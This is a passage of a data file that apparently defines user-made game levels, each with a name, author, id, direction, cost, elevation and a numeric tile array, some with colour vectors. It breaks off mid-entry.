,14,9998,13,54,132,114,54,13,9998,14,135,114,1,10,65,5,5,0,135,135,14,9998,13,19,54,54,19,13,9998,14,135,114,1,12,0,0,0,1,114,135,14,9998,13,13,13,13,13,13,9998,14,135,114,1,93,0,0,0,1,114,114,135,14,9998,9998,9998,9998,9998,9998,14,135,114,114,1,0,0,0,0,0,1,114,114,135,14,14,14,14,14,14,135,114,114,1,0,0,0,0,0,0,0,1,114,114,135,135,135,135,135,135,114,114,1,0,0,0,0,0,0,0,0,0,1,88,114,114,114,114,114,114,88,1,0,0,0,0,0,0,0,0,0,0,0,1,1,1,95,95,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0]});
maps.push({name="overdose",author="alli",id="#1673245244",direction="forward",cost=263,elevation=0,map=[0,0,0,0,0,0,187,9,179,169,0,170,0,0,0,1,2,2,1,0,0,0,0,187,18,174,1,1,1,1,1,176,13,186,1,94,121,121,94,1,0,0,0,0,0,1,5,5,5,5,5,1,1,1,90,121,121,121,121,1,0,0,0,0,0,1,5,65,65,65,5,24,23,22,121,121,121,121,121,1,0,0,0,0,0,1,5,65,131,65,5,24,23,22,121,121,121,121,121,1,0,0,0,0,0,1,5,65,65,65,5,24,23,22,121,121,121,121,121,1,0,0,0,0,0,1,5,5,5,5,5,1,1,1,90,121,121,121,121,1,0,0,0,187,13,177,1,1,1,1,1,173,18,186,1,1,121,121,1,0,0,0,0,0,0,0,187,9,180,0,0,170,0,0,1,90,121,121,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,121,121,121,121,1,0,0,0,0,0,0,0,0,0,0,0,0,0,172,1,121,121,121,121,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,121,121,90,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,1,96,96,1,0,0,0,0,0,1,93,124,1,1,1,1,0,0,0,1,121,121,121,97,1,0,0,0,0,1,93,124,65,5,5,5,1,1,1,1,121,121,121,121,1,0,0,0,0,1,133,124,65,5,132,5,105,5,3,121,121,121,121,134,1,0,0,0,0,1,93,124,65,5,5,5,1,1,1,1,121,121,121,121,1,0,0,0,0,1,93,124,1,1,1,1,0,0,0,1,121,121,121,121,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,88,121,121,88,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0]});
maps.push({name="Judgement",author="Mini",id="#1673272535",direction="right",cost=230,elevation=8,map=[0,0,25,2,2,25,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,25,25,25,25,25,0,0,0,0,1,32,96,96,32,1,0,0,0,0,0,25,25,25,25,94,0,0,0,1,32,96,96,96,96,32,1,0,0,0,25,25,25,25,25,94,0,0,1,93,31,96,0,0,96,33,93,1,0,0,25,25,0,182,181,0,0,1,31,31,31,0,0,0,0,33,33,105,105,0,25,25,0,0,0,0,0,1,31,31,0,0,0,0,0,33,33,105,105,0,0,0,0,0,0,0,0,31,31,31,0,176,178,0,0,33,33,177,105,0,25,25,0,0,0,0,0,30,30,0,187,25,25,186,0,33,33,105,105,0,25,25,0,0,0,0,0,30,30,0,187,25,25,186,0,33,33,105,105,0,26,26,0,174,180,0,0,0,0,0,0,175,179,0,33,33,105,105,105,0,26,26,0,25,25,0,0,30,30,0,0,0,0,0,33,105,105,105,105,0,0,0,0,188,188,0,0,30,30,0,0,0,0,33,33,105,93,105,97,0,26,26,0,0,0,0,29,29,29,0,0,0,33,33,33,105,105,105,105,0,26,26,0,0,0,0,29,29,1,0,0,33,33,33,105,105,105,33,33,0,26,26,0,168,0,0,28,28,1,0,0,33,33,105,105,105,33,33,2,0,26,26,0,173,0,0,28,28,1,0,33,33,33,105,131,105,33,33,2,0,1,26,27,27,27,27,27,1,0,0,33,132,33,105,105,105,33,33,0,0,0,1,27,27,27,27,1,0,0,0,33,33,33,33,33,33,33,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,33,33,33,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ride",author="tilgep",id="#1673277578",direction="forward",cost=137,elevation=0,map=[0,0,0,35,2,2,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,189,189,0,1,0,0,0,35,35,0,0,0,0,0,0,0,0,0,0,0,35,35,0,35,0,0,0,35,35,0,173,170,0,0,0,1,1,0,0,170,174,175,0,75,0,0,0,35,35,0,35,186,0,0,0,0,0,0,0,0,0,0,0,75,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0,75,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,75,0,0,0,0,0,0,178,0,0,0,0,1,177,170,0,0,0,176,0,35,0,0,0,0,0,0,35,186,0,0,0,1,35,186,0,0,187,35,0,35,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,35,35,35,0,0,171,0,0,0,0,0,0,0,0,0,0,0,188,35,2,2,35,0,0,0]});
maps.push({name="Ankle tapper",author="ZpLit",id="#1673283929",direction="left",cost=207,elevation=6,map=[0,0,0,0,0,0,0,2,2,76,76,76,76,28,28,28,0,0,0,0,0,0,0,0,0,0,0,8,8,147,147,147,147,147,147,28,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,147,28,0,0,0,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,147,28,0,0,0,0,0,0,0,0,0,0,0,90,8,8,90,87,0,0,147,28,0,0,0,0,1,0,0,0,0,0,0,87,8,8,8,8,0,0,147,28,0,0,0,0,132,1,1,1,0,0,0,0,0,0,8,8,0,0,147,28,0,0,0,0,2,54,54,54,1,1,1,1,1,0,8,8,0,0,147,28,0,0,0,0,2,54,54,54,1,0,0,0,1,0,8,90,0,0,147,28,0,0,0,0,132,1,53,53,1,0,0,0,1,0,8,8,0,0,147,28,0,0,0,0,1,1,52,52,1,0,0,0,1,0,8,8,0,0,147,28,0,0,0,0,0,1,51,51,1,0,0,0,1,0,8,90,0,0,147,28,0,0,0,0,0,1,50,50,1,0,0,0,1,0,8,8,0,0,147,28,0,0,0,0,0,1,49,49,1,1,1,1,1,0,8,8,0,0,147,28,0,0,0,0,0,1,48,48,1,0,0,0,0,0,90,8,0,0,147,28,0,0,0,0,0,1,48,48,8,8,8,90,8,8,8,8,0,0,147,28,0,0,0,0,0,1,48,48,8,90,8,8,8,8,8,87,0,0,147,28,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,147,28,0,0,0,0,0,0,0,147,147,147,147,147,147,147,147,147,147,147,147,28,0,0,0,0,0,0,131,28,28,28,28,28,28,28,28,28,28,28,28,28,0,0,0,0]});
maps.push({name="Paranoid",author="ZpLit",id="#1673285741",direction="forward",cost=205,elevation=4,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,2,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,10,10,0,147,76,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,90,10,0,147,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,147,76,0,0,0,0,0,0,0,0,0,0,87,12,12,11,10,10,10,0,147,30,0,0,0,0,0,0,0,0,0,0,12,12,12,11,10,10,87,0,147,30,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,147,30,0,0,0,0,0,0,0,0,0,0,11,11,0,147,147,147,147,147,147,30,20,20,20,19,18,17,16,16,16,16,10,10,0,147,30,30,30,30,30,30,20,54,54,53,52,51,50,50,50,50,10,90,0,147,30,0,0,0,0,0,20,54,54,53,52,51,50,50,50,50,10,10,0,147,30,0,0,0,0,0,20,54,54,19,18,17,16,50,50,16,0,0,0,147,30,0,0,0,0,0,20,54,54,20,0,0,17,51,51,17,0,0,0,147,30,0,0,0,0,0,20,54,54,20,0,0,18,52,52,18,147,147,147,147,30,0,0,0,0,0,20,54,54,20,20,20,19,53,53,19,147,30,30,30,30,0,0,0,0,0,20,54,54,54,54,54,54,54,54,20,147,30,0,0,0,0,0,0,0,0,20,54,54,54,54,54,54,54,54,20,147,30,0,0,0,0,0,0,0,0,20,54,54,20,20,20,20,20,20,20,0,131,0,0,0,0,0,0,0,0,1,54,54,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,132,2,2,132,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hot Feet",author="sivi",id="#1673296777",direction="right",cost=235,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,110,110,1,0,0,1,1,90,0,0,0,0,0,0,0,0,0,0,0,0,110,110,1,0,1,1,94,10,0,9,0,0,0,9,0,0,0,9,0,0,110,110,1,0,1,90,10,10,0,0,0,0,0,0,0,0,0,0,0,0,110,110,1,0,1,10,10,10,0,0,0,9,0,0,0,9,0,0,0,0,110,110,1,154,1,10,97,10,0,0,0,0,0,0,0,0,0,0,0,0,110,110,1,10,1,10,10,10,189,189,189,189,189,189,189,189,189,189,189,0,110,110,1,0,1,90,10,10,5,5,5,5,5,5,5,5,5,5,5,1,132,110,1,0,1,10,10,10,195,195,195,195,195,195,195,195,195,195,195,110,110,110,1,157,1,10,10,10,5,5,5,5,5,5,5,5,5,5,5,1,96,96,1,0,1,90,10,10,188,188,188,188,188,188,188,188,188,188,188,1,95,95,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,110,110,2,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,110,110,2,153,1,0,9,0,0,0,0,0,0,0,9,0,0,0,0,1,199,199,1,0,1,0,0,0,0,9,0,0,0,0,0,0,0,0,0,0,110,93,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,110,93,1,0,1,1,0,0,0,0,0,0,9,0,0,0,0,0,0,0,110,93,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,110,131,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Strafe Escape",author="ZpLit",id="#1673303271",direction="left",cost=249,elevation=0,map=[0,17,186,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,17,100,31,0,0,135,135,135,135,19,186,0,0,0,0,0,0,5,5,0,94,17,31,0,0,135,135,135,135,19,186,0,0,0,0,0,0,5,5,0,0,0,127,0,0,0,0,135,135,0,0,0,0,0,0,0,0,5,90,0,0,0,0,0,0,0,0,135,135,0,0,0,0,0,0,0,0,5,5,0,1,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,5,5,0,0,1,0,0,0,0,0,188,188,0,0,0,0,0,0,0,0,90,5,0,0,1,0,0,0,0,0,0,0,0,0,0,18,186,0,0,0,5,5,0,1,0,0,0,0,0,0,0,0,1,0,0,94,1,1,1,1,140,140,0,0,0,0,0,0,0,1,0,0,1,0,0,1,45,45,25,0,140,140,0,14,12,0,0,0,0,1,0,0,1,0,0,1,45,45,25,0,140,140,0,16,18,23,0,0,0,1,126,126,1,0,0,1,45,45,1,1,1,1,0,2,5,21,0,0,0,1,19,19,1,0,0,1,45,45,45,45,45,45,1,2,5,19,0,0,0,1,18,18,1,0,0,1,45,45,45,45,45,45,1,5,4,24,24,93,0,1,17,17,1,0,0,1,45,45,17,19,16,45,1,5,5,20,0,0,0,1,16,16,1,0,0,1,45,45,20,11,93,94,1,5,140,1,1,1,1,1,15,15,1,1,1,1,45,45,22,20,18,1,0,5,5,5,5,6,7,8,49,49,48,47,46,45,45,45,1,0,0,0,0,5,5,5,5,6,7,8,49,49,48,47,46,45,45,45,1,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="Luck Does Not Matter",author="ZpLit",id="#1673304272",direction="forward",cost=177,elevation=-13,map=[0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,18,18,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,18,18,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,52,100,136,52,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,52,52,52,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,52,52,52,90,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,52,52,52,52,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,94,52,52,93,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,52,52,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,53,53,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,54,54,20,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,54,54,20,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,115,115,20,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,5,65,65,5,24,0,0,0,0,0,0,0,0,0,0,24,5,5,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,0,24,5,5,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,0,9998,142,24,24,24,24,24,24,24,24,24,24,142,9998,0,0,0,0,0,0,24,87,5,5,5,95,137,137,95,5,5,5,87,24,0,0,0,0,0,0,24,5,5,5,5,95,5,5,95,5,5,5,5,24,0,0,0,0,0,0,0,24,24,24,24,24,2,2,24,24,24,24,24,0,0,0,0]});
maps.push({name="RACESpaFrancorchamps",author="ZpLit",id="#1673304612",direction="right",cost=193,elevation=-2,map=[0,0,2,2,12,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,0,0,12,12,12,0,0,0,0,0,10,10,10,10,10,10,10,10,10,2,0,11,11,11,1,0,0,0,0,10,10,10,10,10,10,10,10,10,10,2,0,11,11,11,0,0,0,0,0,10,10,10,10,0,0,0,0,0,0,0,10,10,10,10,0,0,0,0,0,10,10,10,0,0,0,0,0,0,0,0,10,10,10,1,0,0,0,0,0,10,10,10,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,10,10,10,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,10,10,10,10,10,0,0,0,0,0,0,8,8,8,0,0,0,0,0,0,0,10,10,10,10,10,10,0,0,0,0,8,8,8,0,0,0,0,0,0,0,0,0,10,10,10,10,10,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,10,10,10,10,10,0,0,0,10,10,10,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,1,10,10,10,0,0,12,12,12,0,0,0,0,0,0,1,13,13,12,12,11,11,11,11,0,0,13,13,13,0,0,0,0,0,0,13,13,13,12,12,11,11,11,11,0,0,14,14,14,0,0,0,0,0,0,13,13,13,12,12,11,11,11,1,0,0,15,15,15,1,0,0,0,1,14,13,13,13,1,0,0,0,0,0,0,0,16,16,16,16,16,15,15,14,14,13,13,13,0,0,0,0,0,0,0,0,16,16,16,16,16,15,15,14,14,13,13,0,0,0,0,0,0,0,0,0,16,16,16,16,16,15,15,14,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="House Of Mirrors",author="ZpLit",id="#1673305440",direction="right",cost=303,elevation=0,map=[0,0,0,0,0,0,0,17,52,2,2,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,52,52,90,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,90,52,52,52,17,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,52,52,52,52,17,17,0,0,0,0,0,0,0,0,0,0,0,17,52,52,52,52,52,90,52,199,17,0,0,0,0,0,0,17,17,17,17,17,52,52,90,52,52,87,199,52,17,17,17,17,17,17,17,52,90,52,52,96,52,52,52,52,52,199,87,90,52,52,52,52,52,88,17,52,52,52,52,96,52,90,52,97,199,52,52,52,52,52,90,52,52,2,17,52,52,52,90,96,52,52,52,199,100,52,52,52,52,52,52,52,52,2,17,52,52,52,52,96,52,87,199,52,52,52,90,52,52,90,52,52,52,88,17,52,90,52,52,17,52,199,87,52,90,52,52,52,17,17,17,17,17,17,17,52,52,52,52,17,199,52,52,52,52,52,52,52,17,0,0,0,0,0,17,52,52,52,52,17,17,17,96,96,96,96,17,17,0,0,0,0,0,0,17,52,52,52,90,52,52,52,52,90,52,52,17,0,0,0,0,0,0,0,17,52,52,52,52,52,52,52,52,52,52,52,17,0,0,0,0,0,0,0,17,52,90,52,52,52,52,90,52,52,52,90,17,0,0,0,0,0,0,0,17,52,52,52,52,52,52,52,52,52,52,52,17,0,0,0,0,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0]});
maps.push({name="Bouncing On My Boys",author="ZpLit",id="#1673309408",direction="forward",cost=249,elevation=10,map=[11,45,2,2,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,45,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,45,45,11,12,13,14,15,16,17,18,19,20,1,1,1,1,0,11,45,45,45,45,45,46,47,48,49,50,51,52,53,54,15,15,15,15,1,11,45,45,45,45,45,46,47,48,49,50,51,52,53,54,15,15,15,15,1,11,45,45,45,45,45,46,47,48,49,50,51,52,53,54,15,90,15,15,1,11,45,45,45,45,45,46,47,48,49,50,51,52,53,54,15,15,15,15,1,11,11,11,11,11,11,12,13,14,15,16,17,18,19,20,15,15,15,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,90,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,1,93,16,5,5,0,5,5,0,5,5,0,5,3,15,15,15,15,15,90,1,16,16,1,1,131,1,1,131,1,1,131,1,1,15,15,15,15,15,15,1,100,16,0,0,11,0,0,9,0,0,7,0,0,15,15,15,90,15,15,1,0,0,0,0,188,0,0,188,0,0,188,0,0,0,1,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,88,2,2,88,1]});
maps.push({name="Death Tier KZ",author="ZpLit",id="#1673319508",direction="left",cost=130,elevation=0,map=[9,0,9,0,9,0,9,0,9,0,9,0,9,0,9,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,29,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,30,22,31,0,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,31,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,141,32,32,32,24,0,0,9,0,0,0,0,0,0,0,0,0,0,24,88,16,0,0,24,0,32,0,4,0,0,0,0,0,0,0,0,0,0,0,24,96,24,24,0,0,0,0,16,0,16,0,16,0,16,0,16,0,16,0,0,16,36,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,24,1,1,24,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,24,0,0,1,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,19,100,0,0,1,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,1,0,36,0,0,0,0,0,0,0,0,0,0,0,0,0,41,0,0,0,0,1,94,21,23,20,22,0,0,0,0,0,0,0,0,0,42,0,0,0,0,1,94,88,9,49,49,24,0,0,0,0,0,0,0,0,43,0,0,0,97,0,1,2,9,24,65,9,0,0,0,0,0,0,0,128,24,0,0,0,24,93,0,2,9,24,65,9,0,0,0,0,0,0,0,128,24,0,0,0,24,93,0,88,9,49,49,24,0,0,0,0,0,0,0,0,127,0,0,0,127,0,0,21,23,20,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Drop Dead",author="ZpLit",id="#1673320151",direction="right",cost=52,elevation=-19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,90,24,135,5,88,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,135,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,24,24,135,5,2,0,0,0,0,0,0,0,0,0,0,0,0,0,94,24,24,24,135,5,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="eyesore v2",author="Applily",id="#1673320567",direction="forward",cost=68,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(233,39,46),Vector(43,255,228),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(25,211,71),Vector(133,5,35),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(251,238,165),Vector(252,205,38),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,Vector(143,255,250),Vector(251,238,165),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(254,172,199),Vector(89,89,89),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(233,39,46),Vector(182,123,88),0,0,Vector(233,39,46),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(252,78,25),Vector(252,25,25),1,1,1,0,Vector(137,36,181),0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(43,255,228),Vector(194,194,194),0,0,0,1,Vector(252,255,25),0,0,0,0,0,0,0,0,0,0,0,0,Vector(233,39,46),0,Vector(252,255,25),0,Vector(233,39,46),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(252,25,25),Vector(46,161,242),0,0,Vector(233,39,46),0,0,Vector(233,39,46),0,0,0,0,0,0,0,0,0,0,0,0,Vector(137,36,181),0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(182,123,88),Vector(133,5,35),1,0,0,0,0,Vector(182,123,88),0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(255,0,242),1,Vector(4,255,35),1,1,0,Vector(43,255,228),0,0,0,0,0,0,0,0,0,0,0,Vector(233,39,46),0,Vector(137,36,181),1,0,Vector(73,59,202),Vector(194,194,194),0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(233,39,46),Vector(233,39,46),Vector(233,39,46),0,Vector(233,39,46),Vector(255,0,242),0,Vector(233,39,46),Vector(233,39,46),0,0,0,0,0,0,0,0,0,0,0,0,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,Vector(233,39,46),Vector(233,39,46),Vector(4,255,35),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,93,89,0,Vector(252,78,25),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="End Of The Line",author="ZpLit",id="#1673322993",direction="left",cost=199,elevation=0,map=[88,5,24,24,24,24,2,2,0,0,0,0,0,0,0,0,0,0,0,0,2,5,24,131,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,2,5,24,24,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,88,5,24,24,24,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,132,9998,4,4,4,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,24,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,87,5,5,5,5,5,5,5,5,5,5,5,5,5,9998,5,5,5,5,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,93,9998,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,9998,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5]});
maps.push({name="Jump for supplies",author="NyaaaDoge",id="#1673341460",direction="left",cost=345,elevation=0,map=[0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,0,1,1,1,1,0,0,0,1,94,5,5,88,5,5,5,132,1,93,94,1,10,5,5,3,1,0,0,1,5,90,5,5,5,90,5,5,1,14,14,1,93,81,81,9,9,1,1,1,5,5,5,5,5,5,3,3,1,13,13,1,10,81,81,9,9,98,96,96,9,9,9,9,9,91,9,9,1,12,12,1,10,81,81,9,9,98,96,96,9,90,9,9,9,91,9,9,1,11,11,1,93,81,81,90,9,1,9,9,1,1,1,91,91,1,141,141,1,10,10,0,10,5,5,9,1,1,10,10,1,1,8,8,8,1,19,19,1,9,9,0,0,0,0,0,0,1,11,11,1,1,7,7,8,1,97,97,1,9,9,0,0,0,0,0,0,1,11,11,1,1,7,7,8,1,1,1,1,9,9,0,0,0,0,0,0,1,12,12,1,1,6,6,8,8,8,8,8,9,9,0,0,0,0,0,0,1,12,12,1,1,6,6,8,8,1,8,8,9,9,0,0,0,0,0,0,1,13,13,1,1,6,6,6,7,7,8,8,9,9,0,0,0,0,0,0,1,13,13,1,90,6,6,6,7,7,1,1,91,1,14,14,0,0,0,0,1,14,14,1,90,6,4,24,24,24,1,0,86,0,2,14,14,14,14,91,91,14,14,1,1,1,1,93,99,131,1,10,10,10,2,14,14,14,14,91,91,14,90,1,0,0,0,1,1,1,0,94,11,94,14,14,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,88,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="P2 Cube",author="NyaaaDoge",id="#1673341528",direction="forward",cost=370,elevation=0,map=[0,0,0,0,0,1,1,0,1,2,2,1,0,1,1,0,0,0,0,0,0,19,19,19,19,19,19,1,19,19,19,19,1,19,19,19,19,19,19,0,0,19,19,Vector(241,241,241),Vector(241,241,241),Vector(241,241,241),Vector(169,170,170),1,Vector(233,230,231),93,94,Vector(235,232,233),1,Vector(169,170,170),Vector(241,241,241),Vector(239,239,239),Vector(238,238,238),19,19,0,0,19,Vector(238,238,238),Vector(228,229,229),Vector(244,244,244),Vector(232,231,230),Vector(141,144,144),1,Vector(217,220,219),Vector(228,222,224),Vector(222,215,218),Vector(221,224,223),1,Vector(139,142,143),Vector(235,233,233),Vector(244,244,243),Vector(228,228,228),Vector(238,238,238),19,0,0,19,Vector(238,238,238),Vector(245,244,244),Vector(204,204,204),Vector(119,123,124),Vector(119,123,124),Vector(129,133,134),Vector(106,128,123),Vector(137,96,113),Vector(136,92,111),Vector(106,129,123),Vector(130,134,135),Vector(118,123,124),Vector(122,126,127),Vector(207,207,207),Vector(244,244,244),Vector(237,237,237),19,0,1,19,V